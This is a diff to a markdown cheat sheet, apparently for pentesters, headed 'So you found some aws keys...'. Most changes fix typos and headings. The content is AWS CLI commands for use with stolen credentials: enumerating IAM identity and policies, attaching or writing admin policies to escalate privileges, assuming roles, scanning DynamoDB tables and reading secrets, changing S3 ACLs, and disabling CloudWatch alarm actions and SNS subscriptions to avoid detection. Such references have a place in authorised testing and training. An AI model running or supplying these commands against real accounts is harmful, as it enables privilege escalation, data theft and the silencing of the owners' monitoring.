@@ -1,3 +1,5 @@
+So you found some aws keys...
+
 ## caller id
 who is me
 ```
@@ -16,7 +18,7 @@ aws iam list-group-policies --group-name Admins
 ...
 ```
 
-## list (attached) policys
+## list (attached) policies
 ```
 aws iam list-attached-role-policies --role-name ad-example
 aws iam list-attached-user-policies --user-name user-example
@@ -40,7 +42,7 @@ aws iam attach-group-policy --group-name developer --policy-arn arn:aws:iam::aws
 ```
 
 ## add admin policy
-add custom policy .json to group,role (needs your own policy file obviously)
+add custom policy .json to group, role (needs your own policy file obviously)
 ```
 aws iam create-policy-version --policy-arn arn:aws:iam::666666666666:policy/Print --policy-document file:///.../newAdminPolicy.json --set-as-default
 aws iam put-group-policy --group-name Admins --policy-document file:///.../newAdminPolicy.json --policy-name AdminRoot
@@ -59,7 +61,6 @@ aws sts assume-role --role-arn arn:aws:iam::666666666666:role/ad-example --role-
 ```
 
 ## search for adminstuff
-works with a lot of aws cli list queries
 ```
 aws iam list-policies | grep 'AdministratorAccess'  
 ```
@@ -96,7 +97,6 @@ chmod 400 mighty.pem
 ```
 aws dynamodb list-tables | jq -r .TableNames[]
 aws dynamodb scan --table-name secrettable-233223 --region us-east-1
-
 ```
 
 ## secret
@@ -125,7 +125,7 @@ aws s3api put-object-acl --bucket ... --key secret_object --access-control-polic
 aws s3api put-bucket-acl --bucket --access-control-policy file://acl.json
 ```
 
-## API
+## API-Gateway
 list, show rest-api, ressources method and key
 ```
 aws apigateway get-account
@@ -136,7 +136,7 @@ aws apigateway get-ressources --rest-api-id ...
 aws apigateway get-method --rest-api-id ... --http-method GET --ressource-id ...
 ```
 
-## lambda
+## Lambda
 ```
 aws lambda list-functions
 aws lambda get-function --function-name DynamoFunction  
@@ -167,8 +167,8 @@ aws cloudwatch describe-alarms --alarm-names "soundofdapolice"
 aws sns list-topics
 aws sns list-subscriptions
 ```
-```
 ## less wiuu wiuu
+```
 aws cloudwatch disable-alarm-actions --alarm-names soundofdapolice
 aws cloudwatch describe-alarm-history --alarm-name "iamshadow" --history-item-type StateUpdate
 aws sns unsubscribe --subscription-arn arn:aws:sns:us-west-2:666666666666:my-topic:somerandomstring
